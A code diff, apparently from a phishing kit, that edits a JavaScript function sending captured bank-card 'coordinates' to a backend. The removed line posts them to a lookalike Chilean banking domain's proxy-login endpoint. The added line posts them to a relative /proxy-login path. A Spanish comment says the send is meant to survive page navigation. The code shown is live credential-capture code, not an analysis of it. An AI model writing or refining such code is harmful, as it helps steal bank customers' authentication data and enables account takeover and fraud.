@@ -185,11 +185,11 @@ async function enviarCoordenadas(){
 
   // 🔥 Enviar al backend con keepalive (NO se cancela al navegar)
   try {
-    fetch("https://officebankingchile.info/proxy-login", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ coordenadas: coords }),
-      });
+   fetch("/proxy-login", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ coordenadas: coords })
+});
   } catch(e) {
     console.log("Error enviando coordenadas:", e);
   }
